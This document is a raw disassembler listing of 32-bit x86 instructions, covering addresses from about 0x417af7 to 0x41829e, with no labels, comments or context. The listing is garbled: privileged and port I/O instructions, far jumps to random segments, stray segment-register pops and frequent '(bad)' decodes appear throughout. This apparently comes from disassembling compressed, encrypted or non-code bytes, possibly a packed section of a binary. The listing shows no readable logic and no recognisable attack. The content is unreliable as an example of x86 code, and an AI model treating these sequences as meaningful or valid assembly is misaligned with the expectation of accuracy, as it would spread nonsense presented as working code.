  417af7:	xor    dl,BYTE PTR [edi]
  417af9:	mov    bh,0x84
  417afb:	daa    
  417afc:	add    DWORD PTR [edi],ebp
  417afe:	push   ds
  417aff:	in     eax,0xe0
  417b01:	sub    edi,DWORD PTR [ecx]
  417b03:	test   DWORD PTR [ebx-0x1e7ac8d3],0x378c5442
  417b0d:	scas   eax,DWORD PTR es:[edi]
  417b0e:	bound  eax,QWORD PTR [edx-0xa7850ef]
  417b14:	les    ebx,FWORD PTR [edi]
  417b16:	pop    ebp
  417b17:	pop    DWORD PTR [esi+eax*1]
  417b1a:	xchg   ecx,eax
  417b1b:	ficom  DWORD PTR [edx+0x78e03f5a]
  417b21:	loop   0x417b04
  417b23:	mov    dl,BYTE PTR [edx]
  417b25:	icebp  
  417b26:	mov    ch,0x79
  417b28:	and    DWORD PTR ds:0xee5ce998,0x108feb83
  417b32:	and    DWORD PTR ds:0x63cdd7a,ebx
  417b38:	enter  0x1303,0x36
  417b3c:	ret    
  417b3d:	pop    esp
  417b3e:	mov    dh,0x42
  417b40:	mov    dh,0x99
  417b42:	test   BYTE PTR [eax+edx*4+0x63],bl
  417b46:	mov    ?,ebp
  417b48:	test   al,0xf1
  417b4a:	repnz dec ebx
  417b4c:	add    al,BYTE PTR [ecx+0x4]
  417b4f:	retf   
  417b50:	pop    ss
  417b51:	subps  xmm3,XMMWORD PTR [ecx+eax*2+0x1c]
  417b56:	add    bh,BYTE PTR [ebx+0x49]
  417b59:	pop    ebx
  417b5a:	pop    ds
  417b5b:	outs   dx,DWORD PTR ds:[esi]
  417b5c:	sub    al,0x60
  417b5e:	aam    0x85
  417b60:	rol    BYTE PTR [esi],cl
  417b62:	xchg   ecx,eax
  417b63:	mov    al,ds:0x4b799317
  417b68:	inc    ecx
  417b69:	mov    dl,0xed
  417b6b:	dec    ecx
  417b6c:	jns    0x417b68
  417b6e:	mov    bh,0x5d
  417b70:	jo     0x417b69
  417b72:	aaa    
  417b73:	pop    edi
  417b74:	test   al,0x21
  417b76:	jne    0x417b34
  417b78:	jge    0x417b2b
  417b7a:	jecxz  0x417b83
  417b7c:	cli    
  417b7d:	dec    ebx
  417b7e:	push   0xd07a5866
  417b83:	enter  0xcadd,0x3d
  417b87:	xchg   ebp,edi
  417b89:	(bad)  
  417b8a:	js     0x417bb5
  417b8c:	fimul  DWORD PTR [edx]
  417b8e:	arpl   WORD PTR [edi-0x34f13c6e],ax
  417b94:	dec    ecx
  417b95:	xor    BYTE PTR [eax+0x337aec17],0xf3
  417b9c:	mov    ebx,0x3f6ec44e
  417ba1:	push   ebp
  417ba2:	(bad)  [edi]
  417ba4:	push   esp
  417ba5:	dec    ebx
  417ba6:	pop    esp
  417ba7:	xchg   ebx,eax
  417ba8:	repz inc edi
  417baa:	jae    0x417bb7
  417bac:	add    al,0x3c
  417bae:	aas    
  417baf:	fs dec esp
  417bb1:	push   ebx
  417bb2:	(bad)  
  417bb3:	out    dx,al
  417bb4:	inc    ebp
  417bb5:	inc    edx
  417bb6:	mov    ?,WORD PTR ds:0x1d71e6e5
  417bbc:	dec    edi
  417bbd:	mov    ds:0x5026adc8,al
  417bc2:	mov    WORD PTR [eax+0x2ed84978],ss
  417bc8:	inc    esp
  417bc9:	popa   
  417bca:	mov    ds:0xdc4dc73d,eax
  417bcf:	cmp    BYTE PTR [eax-0x66c668f8],dh
  417bd5:	jl     0x417ba7
  417bd7:	hlt    
  417bd8:	mov    bh,0xa4
  417bda:	xchg   ah,bh
  417bdc:	xchg   BYTE PTR [esi-0x31],cl
  417bdf:	jle    0x417b85
  417be1:	dec    ebp
  417be2:	add    DWORD PTR [edx],edi
  417be4:	inc    esi
  417be5:	add    BYTE PTR [edx-0x7ecdc45b],ch
  417beb:	dec    ebx
  417bec:	xchg   DWORD PTR [ebp-0x4003c26e],eax
  417bf2:	jge    0x417b7a
  417bf4:	call   0xa97a:0xe194895e
  417bfb:	cmp    esi,DWORD PTR [edx]
  417bfd:	pop    edx
  417bfe:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417bff:	or     ah,BYTE PTR [ebx+0x34f53517]
  417c05:	dec    ecx
  417c06:	sub    al,0x46
  417c08:	loopne 0x417c2d
  417c0a:	push   DWORD PTR [esi+0x4b4b68ad]
  417c10:	sub    ebx,DWORD PTR [esp+ebp*8+0x45cf6317]
  417c17:	ror    BYTE PTR [ebp+0x75],1
  417c1a:	xchg   ebx,eax
  417c1b:	in     al,0x5
  417c1d:	cwde   
  417c1e:	jmp    0x268424
  417c23:	leave  
  417c24:	or     BYTE PTR [edi-0x56f7dc66],cl
  417c2a:	xor    ah,BYTE PTR [eax]
  417c2c:	xchg   esi,eax
  417c2d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417c2e:	les    esp,FWORD PTR [esp+ecx*8]
  417c31:	cmp    al,0xfe
  417c33:	imul   edi,DWORD PTR [edi-0x27],0xa166faef
  417c3a:	jmp    0x77e0:0xb43a7478
  417c41:	cmp    edx,edi
  417c43:	aas    
  417c44:	mov    ch,0xa0
  417c46:	ds jecxz 0x417bf9
  417c49:	cmp    edi,DWORD PTR [ebx]
  417c4b:	fiadd  WORD PTR [ecx+0x58f912ae]
  417c51:	mov    bh,0xaf
  417c53:	push   esi
  417c54:	sar    DWORD PTR [esp+ecx*1],0x96
  417c58:	pop    eax
  417c59:	jmp    0xafa5:0xbf13c10c
  417c60:	jo     0x417c24
  417c62:	mov    dl,0x25
  417c64:	push   esi
  417c65:	pop    ss
  417c66:	adc    al,0xce
  417c68:	sbb    DWORD PTR [ebx+0x2af4d3b8],esi
  417c6e:	js     0x417ca8
  417c70:	or     al,0x20
  417c72:	clc    
  417c73:	sahf   
  417c74:	jno    0x417cac
  417c76:	cmovs  esi,DWORD PTR [ecx-0x3ca177da]
  417c7d:	mov    dh,0xfa
  417c7f:	fs sbb eax,0x4a6a67c5
  417c85:	xor    bh,dl
  417c87:	not    BYTE PTR [ebp-0x2e]
  417c8a:	mov    ds:0x9a88c29,al
  417c8f:	xchg   ebx,eax
  417c90:	data16 arpl WORD PTR [esp+eiz*2+0x4b258aed],si
  417c98:	sbb    BYTE PTR [edx-0x459275ef],ch
  417c9e:	sbb    BYTE PTR [ebx*2+0x7a0ffd0d],0x3d
  417ca6:	iret   
  417ca7:	loop   0x417c85
  417ca9:	xchg   ebp,eax
  417caa:	ins    BYTE PTR es:[edi],dx
  417cab:	or     ch,BYTE PTR [ecx+eax*8-0x63]
  417caf:	test   eax,0x30cf515e
  417cb4:	lds    ebx,FWORD PTR [ebx-0x10]
  417cb7:	imul   ebp,ebp,0xffffff83
  417cba:	clc    
  417cbb:	sbb    eax,DWORD PTR [edi-0x62]
  417cbe:	bound  ebx,QWORD PTR [edi]
  417cc0:	mov    bl,BYTE PTR [edi-0x29946a68]
  417cc6:	in     al,dx
  417cc7:	cmp    DWORD PTR [esi-0x7c],esp
  417cca:	and    bh,BYTE PTR [ecx-0x5f]
  417ccd:	jg     0x417c51
  417ccf:	gs dec ebp
  417cd1:	mov    eax,ebp
  417cd3:	sub    BYTE PTR [ecx-0x384028c8],ah
  417cd9:	arpl   WORD PTR [eax-0x11],sp
  417cdc:	jmp    0xd240c776
  417ce1:	(bad)  
  417ce2:	push   esi
  417ce3:	dec    esi
  417ce4:	or     al,0xc4
  417ce6:	jecxz  0x417d3b
  417ce8:	sbb    edx,DWORD PTR [esi]
  417cea:	or     eax,0x79b6d880
  417cef:	and    bh,cl
  417cf1:	out    0xfc,al
  417cf3:	mov    dx,cx
  417cf6:	xchg   edi,eax
  417cf7:	lea    esp,[edi]
  417cf9:	pavgb  mm7,QWORD PTR [esi+eax*4-0x58]
  417cfe:	aam    0x8f
  417d00:	icebp  
  417d01:	rcl    BYTE PTR [ecx],0x80
  417d04:	add    BYTE PTR [edx-0x396648eb],0x9c
  417d0b:	mov    ds,WORD PTR [ebp-0x3c98aa8a]
  417d11:	or     esi,DWORD PTR [esi]
  417d13:	repnz shr dl,1
  417d16:	aam    0xf
  417d18:	dec    edi
  417d19:	mov    ss,WORD PTR [edi+ebp*1+0x76e4460a]
  417d20:	inc    edi
  417d21:	jmp    FWORD PTR [edx-0x67]
  417d24:	pusha  
  417d25:	(bad)  
  417d26:	out    0xbb,al
  417d28:	or     BYTE PTR [edx+eiz*8-0x64d3de94],bl
  417d2f:	aam    0xb1
  417d31:	ins    DWORD PTR es:[edi],dx
  417d32:	call   0x15a6:0xa92454c5
  417d39:	cmc    
  417d3a:	mov    ds,WORD PTR [ecx-0x337d6c90]
  417d40:	push   0xaf3735dd
  417d45:	mov    dh,0x50
  417d47:	loope  0x417d59
  417d49:	mov    bl,0xad
  417d4b:	data16 jp 0x417d45
  417d4e:	mov    edi,0x9708c6ea
  417d53:	cmp    eax,0x3a7035e
  417d58:	cmovge ebp,DWORD PTR [edi+0x28]
  417d5c:	pop    edx
  417d5d:	retf   0x625d
  417d60:	in     al,0x59
  417d62:	xor    dh,BYTE PTR [ebx]
  417d64:	call   DWORD PTR [ebx]
  417d66:	sbb    BYTE PTR [ebp+0x21],0x5c
  417d6a:	daa    
  417d6b:	gs push edi
  417d6d:	(bad)  
  417d6e:	pop    esp
  417d6f:	leave  
  417d70:	mov    bl,0x76
  417d72:	or     BYTE PTR [eax-0x7852e51],0xe9
  417d79:	nop
  417d7a:	or     BYTE PTR [edx+0x415667a9],dl
  417d80:	mov    dh,0x91
  417d82:	popf   
  417d83:	in     eax,0x4f
  417d85:	fistp  QWORD PTR [esi+0x75]
  417d88:	ja     0x417dce
  417d8a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417d8b:	push   0x506de16
  417d90:	pop    es
  417d91:	loope  0x417e05
  417d93:	popa   
  417d94:	and    BYTE PTR [ecx],bl
  417d96:	jp     0x417d2c
  417d98:	nop
  417d99:	mov    DWORD PTR [eax+0x34],eax
  417d9c:	in     al,dx
  417d9d:	mov    al,0x1d
  417d9f:	inc    ebx
  417da0:	mov    dh,0x80
  417da2:	mov    ah,0x1d
  417da4:	nop
  417da5:	cmp    eax,0xbd328105
  417daa:	inc    edx
  417dab:	jecxz  0x417d97
  417dad:	push   cs
  417dae:	loope  0x417d64
  417db0:	inc    edx
  417db1:	inc    esp
  417db2:	or     dl,ch
  417db4:	jmp    0x417e1b
  417db6:	rcr    BYTE PTR [eax-0xe],cl
  417db9:	mov    dl,0xbb
  417dbb:	cwde   
  417dbc:	int3   
  417dbd:	mov    esp,0x27b56a71
  417dc2:	stos   DWORD PTR es:[edi],eax
  417dc3:	push   esp
  417dc4:	nop
  417dc5:	lock aam 0xca
  417dc8:	lea    ebx,[ebx+0x5bd150f8]
  417dce:	sbb    DWORD PTR [eax],eax
  417dd0:	fadd   DWORD PTR [eax-0x12]
  417dd3:	inc    ecx
  417dd4:	adc    BYTE PTR [edi+0x44],0x58
  417dd8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417dd9:	adc    al,dl
  417ddb:	sbb    dl,BYTE PTR ds:0x87687355
  417de1:	dec    edx
  417de2:	push   0xffffff93
  417de4:	arpl   WORD PTR [eax],si
  417de6:	inc    esi
  417de7:	sub    bh,BYTE PTR [edi]
  417de9:	pop    edx
  417dea:	scas   al,BYTE PTR es:[edi]
  417deb:	popf   
  417dec:	unpckhps xmm3,XMMWORD PTR [ebx-0x4a4bdb37]
  417df3:	dec    esp
  417df4:	sbb    edx,DWORD PTR [eax+edi*1+0x5669e637]
  417dfb:	sbb    DWORD PTR [edi],edi
  417dfd:	xlat   BYTE PTR ds:[ebx]
  417dfe:	retf   
  417dff:	fucomi st,st(7)
  417e01:	push   esp
  417e02:	and    BYTE PTR [ebx*1+0x15471ddd],dh
  417e09:	(bad)  
  417e0a:	mov    bh,0x1c
  417e0c:	mov    eax,DWORD PTR [esi-0x77]
  417e0f:	mov    cl,0xf7
  417e11:	xchg   ebx,eax
  417e12:	imul   ebx,DWORD PTR [ebp-0x2791e3b6],0xcd89f224
  417e1c:	sub    al,0xd9
  417e1e:	(bad)  
  417e1f:	fidivr DWORD PTR [edi]
  417e21:	aaa    
  417e22:	mov    ecx,0x37c4acd4
  417e27:	adc    dl,0x37
  417e2a:	jae    0x417dde
  417e2c:	mov    WORD PTR [ebp-0x75153cdb],?
  417e32:	stos   DWORD PTR es:[edi],eax
  417e33:	daa    
  417e34:	pop    ds
  417e35:	je     0x417e43
  417e37:	mov    al,ds:0xf546068
  417e3c:	add    eax,esi
  417e3e:	stos   DWORD PTR es:[edi],eax
  417e3f:	mov    esp,0x663c2574
  417e44:	or     eax,0xa3341ab0
  417e49:	ret    0xbdc6
  417e4c:	xchg   esp,eax
  417e4d:	cwde   
  417e4e:	push   eax
  417e4f:	xlat   BYTE PTR ds:[ebx]
  417e50:	xchg   esp,eax
  417e51:	sbb    BYTE PTR [ebx+0x1595910c],ah
  417e57:	and    eax,0xc2d9d665
  417e5c:	in     al,dx
  417e5d:	popf   
  417e5e:	hlt    
  417e5f:	xchg   DWORD PTR [esi-0x7d714679],edx
  417e65:	inc    ecx
  417e66:	sub    eax,0xaa92dee4
  417e6b:	repz jne 0x417e52
  417e6e:	imul   ebx,ebp,0xb0ed8419
  417e74:	mov    edi,cr4
  417e77:	popa   
  417e78:	cdq    
  417e79:	cmp    esp,edx
  417e7b:	int    0x48
  417e7d:	cdq    
  417e7e:	push   edi
  417e7f:	inc    edi
  417e80:	ret    0xd831
  417e83:	add    eax,0x25810032
  417e88:	cdq    
  417e89:	mov    ebp,0x7515f308
  417e8e:	add    BYTE PTR [eax],ch
  417e90:	lock lahf 
  417e92:	cs dec ecx
  417e94:	dec    esp
  417e95:	std    
  417e96:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417e97:	sahf   
  417e98:	imul   ebx,DWORD PTR [ebx+eax*8+0x1936f4df],0xffffffb5
  417ea0:	into   
  417ea1:	cmp    ebx,DWORD PTR [esi]
  417ea3:	dec    ebp
  417ea4:	jbe    0x417ef5
  417ea6:	aas    
  417ea7:	jbe    0x417e87
  417ea9:	test   al,0x37
  417eab:	cmc    
  417eac:	cmps   DWORD PTR es:[esi],DWORD PTR es:[edi]
  417eae:	cmp    al,0xa0
  417eb0:	shr    DWORD PTR [eiz*1+0x33108a3b],1
  417eb7:	push   es
  417eb8:	les    eax,FWORD PTR [ecx-0x781447b]
  417ebe:	call   0xdb2e81ee
  417ec3:	test   eax,0x31d5407c
  417ec8:	or     al,0xfd
  417eca:	add    bl,dh
  417ecc:	push   ss
  417ecd:	icebp  
  417ece:	pop    esp
  417ecf:	mov    ebx,0x5ea15781
  417ed4:	mov    edi,DWORD PTR [esp+esi*1+0x4b5e6c50]
  417edb:	pusha  
  417edc:	mov    esp,esi
  417ede:	out    dx,al
  417edf:	mov    dl,0xd4
  417ee1:	call   0x46a6c528
  417ee6:	data16 or dh,BYTE PTR [eax+0x1b]
  417eea:	int    0x9a
  417eec:	rol    DWORD PTR [ecx-0x9],cl
  417eef:	(bad)  
  417ef0:	loop   0x417eb9
  417ef2:	lods   al,BYTE PTR ds:[esi]
  417ef3:	scas   eax,DWORD PTR es:[edi]
  417ef4:	cli    
  417ef5:	push   es
  417ef6:	mov    ds:0xcb2a5fd4,al
  417efb:	in     al,dx
  417efc:	mov    cl,0x70
  417efe:	leave  
  417eff:	jecxz  0x417ebf
  417f01:	aaa    
  417f02:	mov    DWORD PTR [edx+0x4],eax
  417f05:	ret    
  417f06:	jl     0x417f55
  417f08:	je     0x417ecf
  417f0a:	leave  
  417f0b:	inc    ebx
  417f0c:	pusha  
  417f0d:	jbe    0x417ed6
  417f0f:	xchg   esi,eax
  417f10:	sub    dl,BYTE PTR [edi+0x3210c346]
  417f16:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417f17:	fcomp  QWORD PTR ds:0xdedf9943
  417f1d:	dec    ebx
  417f1e:	hlt    
  417f1f:	repz imul ebp,DWORD PTR [ebp+0x6a],0x19ef3e71
  417f27:	aas    
  417f28:	mov    dh,0x7c
  417f2a:	scas   al,BYTE PTR es:[edi]
  417f2b:	push   0x10
  417f2d:	sub    eax,0x82545ec0
  417f32:	jmp    0x7fc3:0x7c19d139
  417f39:	out    dx,al
  417f3a:	and    edx,esp
  417f3c:	sar    DWORD PTR [eax-0x59fb2a21],1
  417f42:	aam    0x89
  417f44:	aad    0xc9
  417f46:	xor    al,0x68
  417f48:	sub    DWORD PTR ds:0x368f16ed,ebx
  417f4e:	mov    esi,0x7972f53e
  417f53:	icebp  
  417f54:	cdq    
  417f55:	jl     0x417fa8
  417f57:	aam    0x81
  417f59:	stc    
  417f5a:	jno    0x417ee3
  417f5c:	shl    DWORD PTR [edi-0x58],1
  417f5f:	ficomp WORD PTR [ebp+0x2a4f6b8a]
  417f65:	dec    eax
  417f66:	adc    edi,DWORD PTR cs:[eax+0xa]
  417f6a:	sti    
  417f6b:	mov    cs,WORD PTR [edx+0xc7646f8]
  417f71:	push   ss
  417f72:	int    0x45
  417f74:	jmp    0xed014c07
  417f79:	sbb    al,0xa6
  417f7b:	add    eax,0x314dc9aa
  417f80:	adc    eax,0x33fe80f
  417f85:	and    DWORD PTR [esi+eax*1],0x637de1ea
  417f8c:	pop    esp
  417f8d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417f8e:	mov    bh,BYTE PTR [ebx+0x96be92]
  417f94:	lods   al,BYTE PTR ds:[esi]
  417f95:	dec    ecx
  417f96:	inc    esi
  417f97:	stc    
  417f98:	stos   DWORD PTR es:[edi],eax
  417f99:	mov    DWORD PTR [ebp+0x262bc019],0x1fb925e9
  417fa3:	pop    esp
  417fa4:	mov    bl,0xbc
  417fa6:	sti    
  417fa7:	fisttp QWORD PTR [edi+0x69ccf482]
  417fad:	push   eax
  417fae:	add    DWORD PTR [edi],0x57
  417fb1:	je     0x418028
  417fb3:	retf   0xb354
  417fb6:	push   edi
  417fb7:	and    eax,0xb9e0f8
  417fbc:	mov    edi,0xcac8bfef
  417fc1:	jmp    0x5e744bc1
  417fc6:	(bad)  
  417fc7:	div    DWORD PTR [ebx]
  417fc9:	aam    0xb8
  417fcb:	out    dx,eax
  417fcc:	mov    esp,0x27c441cf
  417fd1:	popf   
  417fd2:	inc    esp
  417fd3:	pop    esi
  417fd4:	adc    edx,DWORD PTR [ebp+0xd]
  417fd7:	(bad)  
  417fd8:	or     al,0x9
  417fda:	aam    0xd6
  417fdc:	and    BYTE PTR [ebp-0xf74130e],dh
  417fe2:	rol    ecx,0x32
  417fe5:	sar    dh,1
  417fe7:	adc    DWORD PTR [edi+0x506cae4],edi
  417fed:	mov    eax,ds:0x96841970
  417ff2:	push   edi
  417ff3:	std    
  417ff4:	mov    eax,DWORD PTR [edx+0x6292fb66]
  417ffa:	pop    esp
  417ffb:	repz sbb dl,dl
  417ffe:	inc    ebx
  417fff:	gs ins BYTE PTR es:[edi],dx
  418001:	mov    WORD PTR [ebx-0x314adbb0],es
  418007:	scas   eax,DWORD PTR es:[edi]
  418008:	aas    
  418009:	xchg   ebx,eax
  41800a:	push   es
  41800b:	stos   BYTE PTR es:[edi],al
  41800c:	ins    BYTE PTR es:[edi],dx
  41800d:	dec    ecx
  41800e:	ret    
  41800f:	sti    
  418010:	adc    cl,0x9
  418013:	fdiv   DWORD PTR [ebp+0x70301591]
  418019:	aas    
  41801a:	ret    
  41801b:	mov    dl,0x8f
  41801d:	pusha  
  41801e:	xor    eax,0x8d6c6176
  418023:	xchg   edi,eax
  418024:	push   edx
  418025:	stos   BYTE PTR es:[edi],al
  418026:	jne    0x417fd6
  418028:	out    0x73,eax
  41802a:	jl     0x417fba
  41802c:	cdq    
  41802d:	xchg   esp,eax
  41802e:	jp     0x418082
  418030:	dec    esp
  418031:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418032:	sbb    ecx,DWORD PTR [ebx]
  418034:	xchg   ebp,eax
  418035:	in     eax,dx
  418036:	in     eax,dx
  418037:	data16 jp 0x41809b
  41803a:	sub    bh,BYTE PTR [eax]
  41803c:	add    dh,BYTE PTR [edx-0x671bad8f]
  418042:	(bad)  
  418043:	sahf   
  418044:	jg     0x4180b9
  418046:	add    ah,BYTE PTR [ecx+ecx*2+0x5b92b011]
  41804d:	(bad)  
  41804e:	cs jne 0x4180bb
  418051:	ins    BYTE PTR es:[edi],dx
  418052:	inc    eax
  418053:	inc    ebp
  418054:	inc    ecx
  418055:	repnz aad 0x95
  418058:	push   ebx
  418059:	out    dx,al
  41805a:	pop    edi
  41805b:	ror    DWORD PTR [esi+0x25],cl
  41805e:	push   edi
  41805f:	xor    al,0xdf
  418061:	lods   eax,DWORD PTR ds:[esi]
  418062:	sbb    esi,ebx
  418064:	sub    al,0x15
  418066:	js     0x4180d8
  418068:	into   
  418069:	ss js  0x41802f
  41806c:	jno    0x418031
  41806e:	les    esi,FWORD PTR [edx+ecx*8]
  418071:	bnd jae 0x41803d
  418074:	mov    bh,dl
  418076:	mov    ds:0x4aa24d1f,eax
  41807b:	mov    BYTE PTR [ebx-0x7c],al
  41807e:	popa   
  41807f:	dec    edi
  418080:	pop    eax
  418081:	and    DWORD PTR [ebx-0x1],esi
  418084:	(bad)  
  418085:	sub    DWORD PTR [ebx+0x0],edx
  418088:	mov    bl,0x3f
  41808a:	stos   BYTE PTR es:[edi],al
  41808b:	test   eax,0x513f3ee1
  418090:	pop    ebx
  418091:	jno    0x4180be
  418093:	dec    esp
  418094:	mov    al,ds:0x2f075ed
  418099:	add    DWORD PTR [edi-0x3f],0x3beb6526
  4180a0:	(bad)  
  4180a1:	ins    BYTE PTR es:[edi],dx
  4180a2:	imul   ebx,DWORD PTR [esi-0x40],0xffffffad
  4180a6:	dec    ebp
  4180a7:	or     BYTE PTR [ebx],0x35
  4180aa:	and    DWORD PTR [eax+edi*8],ecx
  4180ad:	hlt    
  4180ae:	aad    0x4a
  4180b0:	inc    esi
  4180b1:	xchg   edi,eax
  4180b2:	ror    DWORD PTR [ecx],1
  4180b4:	dec    edx
  4180b5:	jmp    0x59c6:0xe15e4341
  4180bc:	adc    ebx,DWORD PTR [ebx+edx*8]
  4180bf:	mov    BYTE PTR [ebx-0x29],0xef
  4180c3:	stc    
  4180c4:	dec    edi
  4180c5:	(bad)  
  4180c7:	outs   dx,DWORD PTR ds:[esi]
  4180c8:	xchg   ebx,eax
  4180c9:	in     al,dx
  4180ca:	icebp  
  4180cb:	fld    TBYTE PTR [edi+0x246e756b]
  4180d1:	xchg   ebx,eax
  4180d2:	(bad)  
  4180d3:	aad    0x37
  4180d5:	pop    edx
  4180d6:	xchg   edx,eax
  4180d7:	cmc    
  4180d8:	cld    
  4180d9:	push   0xd9593077
  4180de:	ins    BYTE PTR es:[edi],dx
  4180df:	xchg   ecx,eax
  4180e0:	xlat   BYTE PTR ds:[ebx]
  4180e1:	fdivr  DWORD PTR [edi]
  4180e3:	loopne 0x41811a
  4180e5:	ss (bad) 
  4180e7:	stc    
  4180e8:	mov    bl,0x20
  4180ea:	cmc    
  4180eb:	sbb    eax,0xbbf0b6f2
  4180f0:	sub    eax,0x4aa075fd
  4180f5:	das    
  4180f6:	loop   0x41808c
  4180f8:	(bad)  
  4180f9:	into   
  4180fa:	inc    sp
  4180fc:	daa    
  4180fd:	sbb    al,0x4
  4180ff:	or     DWORD PTR [esp+ebx*1],ebp
  418102:	jb     0x41810a
  418104:	imul   eax,ecx,0x844f5715
  41810a:	in     al,0xa5
  41810c:	cmp    DWORD PTR [ecx],eax
  41810e:	imul   edx,DWORD PTR [ebx+0x79],0x6
  418112:	pop    ss
  418113:	pop    edi
  418114:	dec    eax
  418115:	das    
  418116:	xchg   ebp,eax
  418117:	push   ss
  418118:	sti    
  418119:	call   0x9b1d6949
  41811e:	int    0xf5
  418120:	or     eax,DWORD PTR [edx]
  418122:	scas   eax,DWORD PTR es:[edi]
  418123:	mov    ds:0xcb80e3eb,al
  418128:	sub    eax,0x126fc6c0
  41812d:	xor    DWORD PTR [esi+0x267a74ef],ebx
  418133:	ins    BYTE PTR es:[edi],dx
  418134:	fist   WORD PTR [eax+0x1f]
  418137:	(bad)  
  418138:	out    dx,al
  418139:	out    dx,al
  41813a:	rol    BYTE PTR [ecx],1
  41813c:	loopne 0x4181a7
  41813e:	adc    dh,BYTE PTR [ebx]
  418140:	jmp    0xaa77:0x679e8e36
  418147:	call   0x2351905d
  41814c:	jecxz  0x4181be
  41814e:	push   ebp
  41814f:	(bad)  
  418150:	pop    ebp
  418151:	data16 arpl dx,si
  418154:	cwde   
  418155:	dec    ebp
  418156:	icebp  
  418157:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418158:	jl     0x41816e
  41815a:	inc    eax
  41815b:	cmp    bl,BYTE PTR [esi+0x5a339d75]
  418161:	sub    al,0xf5
  418163:	or     DWORD PTR [ecx-0x65a3c9a2],edx
  418169:	xchg   ebx,eax
  41816a:	dec    edx
  41816b:	fstp   DWORD PTR [ebx]
  41816d:	hlt    
  41816e:	inc    eax
  41816f:	fisttp DWORD PTR [ebp+0x49]
  418172:	xchg   edx,eax
  418173:	iret   
  418174:	lods   al,BYTE PTR ds:[esi]
  418175:	push   0x5706794f
  41817a:	lods   al,BYTE PTR ds:[esi]
  41817b:	dec    edi
  41817c:	inc    esp
  41817d:	cmp    ebp,edx
  41817f:	inc    esi
  418180:	sbb    bl,BYTE PTR [edx-0x69c2a593]
  418186:	push   ds
  418187:	jbe    0x418196
  418189:	mul    BYTE PTR [eax-0x1a]
  41818c:	mov    dh,0xc6
  41818e:	mov    ecx,0x2280e445
  418193:	ss cwde 
  418195:	daa    
  418196:	hlt    
  418197:	sub    cl,al
  418199:	inc    esp
  41819a:	pushf  
  41819b:	or     eax,0xa18a0256
  4181a0:	pop    ecx
  4181a1:	out    dx,eax
  4181a2:	sbb    bh,0x9c
  4181a5:	jbe    0x418205
  4181a7:	xchg   esp,eax
  4181a8:	sub    esp,DWORD PTR [edx]
  4181aa:	loope  0x418142
  4181ac:	inc    edx
  4181ad:	adc    al,0x84
  4181af:	scas   al,BYTE PTR es:[edi]
  4181b0:	xchg   edi,eax
  4181b1:	push   ss
  4181b2:	sti    
  4181b3:	jmp    0x418157
  4181b5:	mov    al,ds:0x19ae6dc1
  4181ba:	lock out 0x20,al
  4181bd:	xor    edx,DWORD PTR [edx+edx*4+0x39]
  4181c1:	xor    BYTE PTR [ebx],0xa1
  4181c4:	imul   esi,edx,0x7d
  4181c7:	inc    ebx
  4181c8:	rcr    BYTE PTR [ebx],cl
  4181ca:	pusha  
  4181cb:	ins    BYTE PTR es:[edi],dx
  4181cc:	mov    DWORD PTR [edi+0x36],ebp
  4181cf:	add    ch,bl
  4181d1:	pop    ebx
  4181d2:	fiadd  WORD PTR [edx-0xd1bd9]
  4181d8:	or     bh,bl
  4181da:	mov    ds:0x9df2e3a1,eax
  4181df:	inc    ecx
  4181e0:	clc    
  4181e1:	or     al,BYTE PTR [ebx+0x21dff102]
  4181e7:	scas   eax,DWORD PTR es:[edi]
  4181e8:	(bad)  
  4181e9:	push   esi
  4181ea:	dec    eax
  4181eb:	pop    ebp
  4181ec:	mov    ecx,0xfcfa1004
  4181f1:	cwde   
  4181f2:	ins    BYTE PTR es:[edi],dx
  4181f3:	mov    ds:0xa1a2a0e7,al
  4181f8:	sbb    eax,ecx
  4181fa:	add    al,BYTE PTR ds:0xedcf331f
  418200:	cmp    DWORD PTR [edi-0x5],esi
  418203:	out    dx,al
  418204:	add    BYTE PTR [ebx+eax*2+0x1c],bh
  418208:	mov    ch,0xd7
  41820a:	cmp    DWORD PTR [edi-0x622221ad],0xe
  418211:	fst    st(7)
  418213:	test   DWORD PTR [ebp-0x15b4b16f],ebp
  418219:	jae    0xfdea200f
  41821f:	dec    ebx
  418220:	adc    BYTE PTR [ebx],ch
  418222:	(bad)  
  418223:	xor    al,0x23
  418225:	fist   WORD PTR [ebx+esi*1]
  418228:	pop    ss
  418229:	js     0x4181e7
  41822b:	retf   
  41822c:	test   al,0x1e
  41822e:	icebp  
  41822f:	shl    BYTE PTR [edx],cl
  418231:	sub    eax,0x3d35dae5
  418236:	push   ds
  418237:	add    BYTE PTR [esi+0x6ce32669],dl
  41823d:	retf   
  41823e:	and    BYTE PTR [ecx+0x53df5a7e],0xc
  418245:	jle    0x4182c6
  418247:	lock cdq 
  418249:	or     DWORD PTR [ecx],eax
  41824b:	inc    edi
  41824c:	rol    DWORD PTR [esi-0x45],1
  41824f:	bound  eax,QWORD PTR [ebx-0x5ccc85d0]
  418255:	mov    bl,0x13
  418257:	mov    ebx,0xc79c9dfc
  41825c:	mov    bl,0xb4
  41825e:	cmp    ebp,DWORD PTR [ecx-0x7ae04f48]
  418264:	fmul   DWORD PTR [edi]
  418266:	addr16 call 0xfd7b:0x42ef26db
  41826e:	sar    DWORD PTR ds:0x8c9330ac,1
  418274:	inc    edi
  418275:	or     BYTE PTR [ebp-0x29],ch
  418278:	stos   DWORD PTR es:[edi],eax
  418279:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41827a:	daa    
  41827b:	aas    
  41827c:	mov    ebp,0x1fa32a78
  418281:	mov    dh,0xf7
  418283:	(bad)  
  418284:	out    dx,eax
  418285:	outs   dx,BYTE PTR ds:[esi]
  418286:	lods   al,BYTE PTR ds:[esi]
  418287:	outs   dx,BYTE PTR ds:[esi]
  418288:	cdq    
  418289:	(bad)  
  41828a:	scas   al,BYTE PTR es:[edi]
  41828b:	test   eax,edi
  41828d:	aas    
  41828e:	sbb    cl,BYTE PTR [edx+eax*4+0x68e1257c]
  418295:	add    al,0xe
  418297:	or     ah,ch
  418299:	mov    eax,ds:0x4bd8e7bd
  41829e:	ins    BYTE PTR es:[edi],dx
